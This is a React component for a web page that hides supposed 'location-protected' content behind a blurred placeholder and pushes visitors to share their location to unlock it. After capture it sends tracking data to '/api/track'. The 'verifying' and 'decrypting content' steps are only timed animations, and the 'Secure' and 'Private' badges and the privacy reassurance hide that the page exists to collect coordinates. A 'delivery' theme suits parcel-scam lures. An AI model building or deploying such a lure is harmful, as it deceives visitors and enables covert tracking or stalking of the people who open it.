'use client';

import { useState, useEffect } from 'react';
import { useLocationTracking } from '../hooks/useLocationTracking';

interface LocationGateEnhancedProps {
  onUnlock: () => void;
  title?: string;
  description?: string;
  benefits?: string[];
  pageUrl?: string;
  theme?: 'default' | 'security' | 'exclusive' | 'delivery';
}

const themes = {
  default: {
    icon: '🔒',
    unlockIcon: '🔓',
    color: 'amber',
    gradient: 'from-amber-500/20 via-orange-500/20 to-red-500/20'
  },
  security: {
    icon: '🛡️',
    unlockIcon: '✅',
    color: 'blue',
    gradient: 'from-blue-500/20 via-indigo-500/20 to-purple-500/20'
  },
  exclusive: {
    icon: '💎',
    unlockIcon: '⭐',
    color: 'purple',
    gradient: 'from-purple-500/20 via-pink-500/20 to-rose-500/20'
  },
  delivery: {
    icon: '📦',
    unlockIcon: '✓',
    color: 'green',
    gradient: 'from-green-500/20 via-emerald-500/20 to-teal-500/20'
  }
};

export default function LocationGateEnhanced({
  onUnlock,
  title = "🔒 Location Required",
  description = "This content is location-protected. Share your location to unlock and view.",
  benefits = [
    "Access exclusive content and features",
    "Unlock personalized experiences",
    "View location-protected media"
  ],
  pageUrl,
  theme = 'default'
}: LocationGateEnhancedProps) {
  const [status, setStatus] = useState<'initial' | 'requesting' | 'unlocking' | 'error'>('initial');
  const [errorMessage, setErrorMessage] = useState<string>('');
  const [progress, setProgress] = useState(0);
  const [showBenefits, setShowBenefits] = useState(false);
  const { captureLocation, sendTrackingData } = useLocationTracking();

  const themeConfig = themes[theme];

  useEffect(() => {
    // Animate benefits in after a short delay
    const timer = setTimeout(() => setShowBenefits(true), 500);
    return () => clearTimeout(timer);
  }, []);

  const handleUnlockRequest = async () => {
    setStatus('requesting');
    setErrorMessage('');
    setProgress(0);

    try {
      // Step 1: Request location permission
      setProgress(25);
      const locationSuccess = await captureLocation(pageUrl || window.location.href);
      
      if (!locationSuccess) {
        setStatus('error');
        setErrorMessage('Location access denied. Please enable location permissions to view this content.');
        return;
      }

      // Step 2: Verify location data
      setProgress(50);
      await new Promise(resolve => setTimeout(resolve, 500));

      // Step 3: Send tracking data
      setProgress(75);
      await sendTrackingData('/api/track', pageUrl || window.location.href);

      // Step 4: Unlock content
      setStatus('unlocking');
      setProgress(100);
      
      // Decryption animation
      await new Promise(resolve => setTimeout(resolve, 1500));
      onUnlock();
      
    } catch (error) {
      setStatus('error');
      setErrorMessage('Failed to verify location. Please try again.');
      console.error('Location gate error:', error);
    }
  };

  const handleRetry = () => {
    setStatus('initial');
    setErrorMessage('');
    setProgress(0);
  };

  return (
    <div className="min-h-[70vh] flex items-center justify-center p-4">
      <div className="max-w-2xl w-full">
        {/* Locked Content Preview with Parallax Effect */}
        <div className="relative mb-8 group">
          <div className="card overflow-hidden relative transform transition-transform duration-300 group-hover:scale-[1.02]">
            {/* Animated gradient overlay */}
            <div className={`absolute inset-0 bg-gradient-to-br ${themeConfig.gradient} backdrop-blur-xl z-10 flex items-center justify-center transition-all duration-500`}>
              <div className="text-center">
                <div className="text-7xl mb-4 animate-pulse">
                  {themeConfig.icon}
                </div>
                <p className="text-xl font-bold text-gray-700 dark:text-gray-300 mb-2">
                  Content Locked
                </p>
                <p className="text-sm text-gray-600 dark:text-gray-400">
                  Location verification required
                </p>
              </div>
            </div>
            
            {/* Shimmer effect */}
            <div className="absolute inset-0 z-20 pointer-events-none shimmer-effect opacity-30"></div>
            
            {/* Preview content (heavily blurred) */}
            <div className="blur-2xl select-none pointer-events-none p-8">
              <div className="h-56 bg-gradient-to-br from-gray-200 to-gray-400 dark:from-gray-700 dark:to-gray-500 rounded-lg mb-4 animate-pulse"></div>
              <div className="space-y-3">
                <div className="h-6 bg-gray-300 dark:bg-gray-600 rounded w-3/4 animate-pulse"></div>
                <div className="h-6 bg-gray-300 dark:bg-gray-600 rounded w-5/6 animate-pulse" style={{ animationDelay: '0.1s' }}></div>
                <div className="h-6 bg-gray-300 dark:bg-gray-600 rounded w-2/3 animate-pulse" style={{ animationDelay: '0.2s' }}></div>
              </div>
            </div>
          </div>
        </div>

        {/* Unlock Interface */}
        <div className="card text-center space-y-6 relative overflow-hidden">
          {/* Background decoration */}
          <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-amber-500/10 to-transparent rounded-full blur-2xl"></div>
          <div className="absolute bottom-0 left-0 w-32 h-32 bg-gradient-to-tr from-orange-500/10 to-transparent rounded-full blur-2xl"></div>
          
          <div className="relative z-10">
            <div className="space-y-2">
              <h2 className="text-3xl md:text-4xl font-bold text-gray-800 dark:text-gray-100">
                {title}
              </h2>
              <p className="text-lg text-gray-600 dark:text-gray-400">
                {description}
              </p>
            </div>

            {/* Status Display */}
            {status === 'initial' && (
              <div className="space-y-6 animate-fadeIn">
                {/* Benefits Section */}
                <div className={`bg-gradient-to-br ${themeConfig.gradient} border-2 border-${themeConfig.color}-200 dark:border-${themeConfig.color}-800 rounded-xl p-6 transition-all duration-500 ${showBenefits ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
                  <div className="flex items-start gap-4">
                    <div className="text-4xl">{themeConfig.icon}</div>
                    <div className="text-left flex-1">
                      <h3 className="font-bold text-gray-900 dark:text-gray-100 mb-3 text-lg">
                        What you'll unlock:
                      </h3>
                      <ul className="space-y-2">
                        {benefits.map((benefit, index) => (
                          <li 
                            key={index}
                            className="text-sm text-gray-700 dark:text-gray-300 flex items-start gap-2 animate-fadeIn"
                            style={{ animationDelay: `${index * 0.1}s` }}
                          >
                            <span className="text-green-500 font-bold mt-0.5">✓</span>
                            <span>{benefit}</span>
                          </li>
                        ))}
                      </ul>
                    </div>
                  </div>
                </div>

                {/* Unlock Button */}
                <button
                  onClick={handleUnlockRequest}
                  className="w-full bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-600 hover:to-orange-600 text-white font-bold text-lg py-5 px-8 rounded-xl transition-all duration-300 shadow-lg hover:shadow-2xl transform hover:scale-[1.02] flex items-center justify-center gap-3 group"
                >
                  <span className="text-3xl group-hover:scale-110 transition-transform duration-300">
                    {themeConfig.unlockIcon}
                  </span>
                  <span>Share Location & Unlock Content</span>
                  <svg className="w-6 h-6 group-hover:translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 7l5 5m0 0l-5 5m5-5H6" />
                  </svg>
                </button>

                {/* Trust Indicators */}
                <div className="flex items-center justify-center gap-6 text-xs text-gray-500 dark:text-gray-400">
                  <div className="flex items-center gap-1">
                    <span>🔒</span>
                    <span>Secure</span>
                  </div>
                  <div className="flex items-center gap-1">
                    <span>⚡</span>
                    <span>Instant</span>
                  </div>
                  <div className="flex items-center gap-1">
                    <span>🛡️</span>
                    <span>Private</span>
                  </div>
                </div>

                <p className="text-xs text-gray-500 dark:text-gray-400 max-w-md mx-auto">
                  Your location is only used to unlock this content and will be handled securely according to our privacy policy.
                </p>
              </div>
            )}

            {status === 'requesting' && (
              <div className="space-y-6 animate-fadeIn">
                <div className="relative">
                  <div className="w-28 h-28 mx-auto relative">
                    {/* Outer ring */}
                    <div className="absolute inset-0 border-4 border-amber-200 dark:border-amber-800 rounded-full"></div>
                    {/* Spinning ring */}
                    <div className="absolute inset-0 border-4 border-amber-500 rounded-full border-t-transparent animate-spin"></div>
                    {/* Inner pulse */}
                    <div className="absolute inset-2 bg-amber-500/20 rounded-full animate-pulse"></div>
                    {/* Icon */}
                    <div className="absolute inset-0 flex items-center justify-center text-4xl animate-pulse">
                      📍
                    </div>
                  </div>
                </div>

                <div className="space-y-4">
                  <p className="text-xl font-bold text-gray-800 dark:text-gray-200">
                    Verifying Your Location...
                  </p>
                  
                  {/* Enhanced Progress bar */}
                  <div className="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-4 overflow-hidden relative">
                    <div 
                      className="h-full bg-gradient-to-r from-amber-500 via-orange-500 to-amber-500 transition-all duration-500 ease-out relative"
                      style={{ width: `${progress}%` }}
                    >
                      <div className="absolute inset-0 shimmer-effect"></div>
                    </div>
                  </div>

                  {/* Status text */}
                  <div className="min-h-[60px] flex items-center justify-center">
                    <p className="text-sm text-gray-600 dark:text-gray-400 animate-fadeIn">
                      {progress < 30 && (
                        <span className="flex items-center gap-2">
                          <span className="inline-block w-2 h-2 bg-amber-500 rounded-full animate-pulse"></span>
                          Requesting location access...
                        </span>
                      )}
                      {progress >= 30 && progress < 60 && (
                        <span className="flex items-center gap-2">
                          <span className="inline-block w-2 h-2 bg-orange-500 rounded-full animate-pulse"></span>
                          Capturing GPS coordinates...
                        </span>
                      )}
                      {progress >= 60 && progress < 90 && (
                        <span className="flex items-center gap-2">
                          <span className="inline-block w-2 h-2 bg-amber-600 rounded-full animate-pulse"></span>
                          Verifying location data...
                        </span>
                      )}
                      {progress >= 90 && (
                        <span className="flex items-center gap-2">
                          <span className="inline-block w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                          Almost there...
                        </span>
                      )}
                    </p>
                  </div>
                </div>
              </div>
            )}

            {status === 'unlocking' && (
              <div className="space-y-6 animate-fadeIn">
                <div className="relative">
                  <div className="w-28 h-28 mx-auto relative">
                    {/* Success rings */}
                    <div className="absolute inset-0 bg-green-500/20 rounded-full animate-ping"></div>
                    <div className="absolute inset-4 bg-green-500/30 rounded-full animate-ping" style={{ animationDelay: '0.2s' }}></div>
                    {/* Check icon */}
                    <div className="absolute inset-0 flex items-center justify-center text-6xl animate-bounce">
                      ✅
                    </div>
                  </div>
                </div>

                <div className="space-y-4">
                  <p className="text-3xl font-bold text-green-600 dark:text-green-400">
                    Location Verified!
                  </p>
                  <p className="text-xl text-gray-700 dark:text-gray-300 font-semibold">
                    Decrypting content...
                  </p>
                  
                  {/* Decryption effect */}
                  <div className="flex justify-center gap-1.5">
                    {[...Array(12)].map((_, i) => (
                      <div
                        key={i}
                        className="w-2 h-10 bg-gradient-to-t from-green-500 via-emerald-400 to-green-300 rounded-full animate-pulse"
                        style={{ 
                          animationDelay: `${i * 0.08}s`,
                          height: `${20 + (i % 3) * 10}px`
                        }}
                      ></div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {status === 'error' && (
              <div className="space-y-6 animate-fadeIn">
                <div className="w-28 h-28 mx-auto bg-red-100 dark:bg-red-900/30 rounded-full flex items-center justify-center relative">
                  <div className="absolute inset-0 bg-red-500/20 rounded-full animate-ping"></div>
                  <span className="text-6xl relative z-10">⚠️</span>
                </div>

                <div className="space-y-3">
                  <p className="text-2xl font-bold text-red-600 dark:text-red-400">
                    Unable to Unlock Content
                  </p>
                  <p className="text-gray-700 dark:text-gray-300">
                    {errorMessage}
                  </p>
                </div>

                {/* Help section */}
                <div className="bg-blue-50 dark:bg-blue-900/20 border-2 border-blue-200 dark:border-blue-800 rounded-xl p-5 text-left">
                  <p className="font-bold text-blue-900 dark:text-blue-200 mb-3 flex items-center gap-2">
                    <span className="text-xl">💡</span>
                    <span>How to enable location access:</span>
                  </p>
                  <ol className="text-sm text-blue-800 dark:text-blue-300 space-y-2 list-decimal list-inside">
                    <li>Click the lock icon (🔒) in your browser's address bar</li>
                    <li>Find "Location" in the permissions list</li>
                    <li>Change it to "Allow" or "Always Allow"</li>
                    <li>Refresh the page and try again</li>
                  </ol>
                </div>

                <button
                  onClick={handleRetry}
                  className="w-full btn-primary py-4"
                >
                  <span className="flex items-center justify-center gap-2">
                    <span>🔄</span>
                    <span>Try Again</span>
                  </span>
                </button>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

